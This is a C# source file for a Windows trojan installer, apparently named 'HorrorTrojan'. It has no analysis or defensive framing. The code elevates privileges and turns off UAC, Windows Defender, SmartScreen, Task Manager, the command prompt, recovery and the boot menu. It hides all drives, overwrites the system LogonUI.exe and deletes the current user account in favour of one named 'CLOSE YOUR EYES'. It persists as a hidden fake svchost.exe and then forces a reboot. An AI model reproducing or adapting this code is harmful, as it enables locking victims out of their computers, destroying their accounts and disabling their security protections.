using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using HorrorTrojan;

namespace LogonUIInstaller
{
    internal static class Program
    {
        private static Mutex mutex;
        private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
        private static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");

        [STAThread]
        static void Main(string[] args)
        {
            bool createdNew;
            mutex = new Mutex(true, "Global\\LogonUIInstallerMutex", out createdNew);
            if (!createdNew) return;

            try
            {
                if (args.Length > 0 && args[0] == "stage2")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);

                    ReplaceLogonUI();
                    Application.Run(new MainInterface());
                    return;
                }

                if (!IsElevated())
                {
                    RestartAsAdmin();
                    return;
                }

                ExtractAllResources();
                ApplySystemBlocks();
                DisableAntivirusAndUAC();
                ApplySettingsToDefaultUser();
                ReplaceUserAccountFixed();
                AddToStartupWithStage2();
                ForceReboot();
            }
            finally
            {
                mutex?.ReleaseMutex();
                mutex?.Dispose();
            }
        }

        // ==================== РАСПАКОВКА РЕСУРСОВ ====================
        private static void ExtractAllResources()
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                ExtractResource("hr.gif", Path.Combine(appDataPath, "hr.gif"));
                ExtractResource("dv.mp3", Path.Combine(appDataPath, "dv.mp3"));
                ExtractResource("vd.gif", Path.Combine(appDataPath, "vd.gif"));
                ExtractResource("kj.gif", Path.Combine(appDataPath, "kj.gif"));
                ExtractResource("kf.gif", Path.Combine(appDataPath, "kf.gif"));
                ExtractResource("wd.webp", Path.Combine(appDataPath, "wd.webp"));
                ExtractResource("fg.ani", Path.Combine(appDataPath, "fg.ani"));
                ExtractResource("LogonUI.exe", Path.Combine(appDataPath, "LogonUI.exe"));

                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                foreach (string file in Directory.GetFiles(appDataPath))
                    File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.ReadOnly);
            }
            catch { }
        }

        private static void ExtractResource(string name, string outputPath)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                {
                    if (stream == null) return;
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    File.WriteAllBytes(outputPath, data);
                }
            }
            catch { }
        }

        // ==================== ЗАМЕНА LogonUI ====================
        private static void ReplaceLogonUI()
        {
            try
            {
                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                if (!File.Exists(originalPath)) return;

                ForceFullAccess(originalPath);
                KillLogonUIProcesses();

                File.SetAttributes(originalPath, FileAttributes.Normal);
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        File.Delete(originalPath);
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        try
                        {
                            File.Move(originalPath, originalPath + ".del");
                            File.Delete(originalPath + ".del");
                            break;
                        }
                        catch { }
                    }
                }

                byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                File.WriteAllBytes(originalPath, customLogonUI);
            }
            catch { }
        }

        private static byte[] ExtractResourceBytes(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
            {
                if (stream == null) throw new Exception($"Resource {resourceName} not found");
                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, data.Length);
                return data;
            }
        }

        private static void ForceFullAccess(string path)
        {
            try
            {
                File.SetAttributes(path, FileAttributes.Normal);
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{path}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(3000);
                p?.Close();
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{path}\" /grant Everyone:F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(3000);
                p?.Close();
            }
            catch { }

            try
            {
                FileInfo fi = new FileInfo(path);
                FileSecurity fs = fi.GetAccessControl();
                fs.SetOwner(WindowsIdentity.GetCurrent().User);
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount(Environment.UserDomainName, Environment.UserName),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount("NT AUTHORITY\\SYSTEM"),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fi.SetAccessControl(fs);
            }
            catch { }
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("LogonUI"))
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
                            p.MainModule.FileName.Contains("System32"))
                        {
                            p.Kill();
                            p.WaitForExit(3000);
                            Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        // ==================== УСТАНОВЩИК ====================
        private static bool IsElevated()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RestartAsAdmin()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Assembly.GetEntryAssembly().Location,
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ForceReboot()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/r /f /t 0",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ApplySystemBlocks()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);

                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                    key.SetValue("", "txtfile", RegistryValueKind.String);
                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                    key.SetValue("", "txtfile", RegistryValueKind.String);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                    key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                    key.SetValue("OptionValue", 1, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
                {
                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DisableAntivirusAndUAC()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
            }
            catch { }
        }

        // ==================== НАСТРОЙКИ ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ ====================
        private static void ApplySettingsToDefaultUser()
        {
            try
            {
                string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
                string cursorPath = Path.Combine(appDataPath, "fg.ani");
                string destPath = Path.Combine(appDataPath, "svchost.exe");

                // Применяем к .DEFAULT (шаблон для новых пользователей)
                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Control Panel\Desktop"))
                {
                    key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Control Panel\Cursors"))
                {
                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                    key.SetValue("No", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                }

                // Автозапуск в .DEFAULT
                using (var key = Registry.Users.CreateSubKey(@".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                }

                // Отключаем экран настройки Windows (OOBE) для всех новых пользователей
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\OOBE"))
                {
                    key.SetValue("DisableOOBE", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE"))
                {
                    key.SetValue("SkipMachineOOBE", 1, RegistryValueKind.DWord);
                    key.SetValue("SkipUserOOBE", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        // ==================== ЗАМЕНА ПОЛЬЗОВАТЕЛЯ (ФИКС) ====================
        private static void ReplaceUserAccountFixed()
        {
            try
            {
                string currentUser = Environment.UserName;
                string newUser = "CLOSE YOUR EYES";
                string destPath = Path.Combine(appDataPath, "svchost.exe");

                // 1. Создаем пользователя (НЕ администратора, обычный пользователь)
                Process p1 = Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user \"{newUser}\" /add /active:yes /passwordchg:no",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p1?.WaitForExit(5000);
                p1?.Close();

                // 2. Убеждаемся, что пользователь НЕ в группе администраторов
                // (по умолчанию net user добавляет в группу Users, не в Administrators)
                // Дополнительно удаляем из администраторов, если вдруг
                Process p2 = Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"localgroup Administrators \"{newUser}\" /delete",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p2?.WaitForExit(3000);
                p2?.Close();

                // 3. Получаем SID нового пользователя
                string sid = GetUserSID(newUser);
                if (!string.IsNullOrEmpty(sid))
                {
                    // 4. Пытаемся загрузить куст и применить настройки
                    string profilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
                    if (Directory.Exists(profilePath))
                    {
                        string ntuserPath = Path.Combine(profilePath, "NTUSER.DAT");
                        if (File.Exists(ntuserPath))
                        {
                            try
                            {
                                // Загружаем куст
                                Process p3 = Process.Start(new ProcessStartInfo
                                {
                                    FileName = "reg",
                                    Arguments = $"load \"HKEY_USERS\\{sid}\" \"{ntuserPath}\"",
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    UseShellExecute = false
                                });
                                p3?.WaitForExit(3000);
                                p3?.Close();

                                // Применяем настройки к загруженному кусту
                                ApplyRegistrySettingsToHive(sid);

                                // Выгружаем куст
                                Process p4 = Process.Start(new ProcessStartInfo
                                {
                                    FileName = "reg",
                                    Arguments = $"unload \"HKEY_USERS\\{sid}\"",
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    UseShellExecute = false
                                });
                                p4?.WaitForExit(3000);
                                p4?.Close();
                            }
                            catch { }
                        }
                    }
                }

                // 5. Добавляем Active Setup для первого входа
                string guid = Guid.NewGuid().ToString("B").ToUpper();
                using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                {
                    key.SetValue("", "SystemUpdate", RegistryValueKind.String);
                    key.SetValue("StubPath", $"\"{Assembly.GetEntryAssembly().Location}\" stage2", RegistryValueKind.String);
                    key.SetValue("Version", "1.0", RegistryValueKind.String);
                }

                // 6. Удаляем старого пользователя
                Process p5 = Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user {currentUser} /delete /y",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
                p5?.WaitForExit(3000);
                p5?.Close();
            }
            catch { }
        }

        private static void ApplyRegistrySettingsToHive(string sid)
        {
            try
            {
                string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
                string cursorPath = Path.Combine(appDataPath, "fg.ani");
                string destPath = Path.Combine(appDataPath, "svchost.exe");

                using (var key = Registry.Users.CreateSubKey($@"{sid}\Control Panel\Desktop"))
                {
                    key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey($@"{sid}\Control Panel\Cursors"))
                {
                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                    key.SetValue("No", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                }

                using (var key = Registry.Users.CreateSubKey($@"{sid}\Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey($@"{sid}\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                }

                using (var key = Registry.Users.CreateSubKey($@"{sid}\Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static string GetUserSID(string username)
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"))
                {
                    foreach (string sid in key.GetSubKeyNames())
                    {
                        using (var subKey = key.OpenSubKey(sid))
                        {
                            string profilePath = subKey.GetValue("ProfileImagePath") as string;
                            if (!string.IsNullOrEmpty(profilePath) && profilePath.EndsWith(username))
                            {
                                return sid;
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        // ==================== УСТАНОВКА АВТОЗАПУСКА ====================
        private static void AddToStartupWithStage2()
        {
            try
            {
                if (!Directory.Exists(appDataPath))
                    Directory.CreateDirectory(appDataPath);

                string selfPath = Assembly.GetEntryAssembly().Location;
                string destPath = Path.Combine(appDataPath, "svchost.exe");
                
                if (File.Exists(selfPath))
                {
                    if (File.Exists(destPath))
                        File.Delete(destPath);
                    File.Copy(selfPath, destPath, true);
                }

                File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.SetAttributes(appDataPath, FileAttributes.Hidden | FileAttributes.ReadOnly);

                // HKLM для всех пользователей (включая нового)
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
            }
            catch { }
        }
    }
}
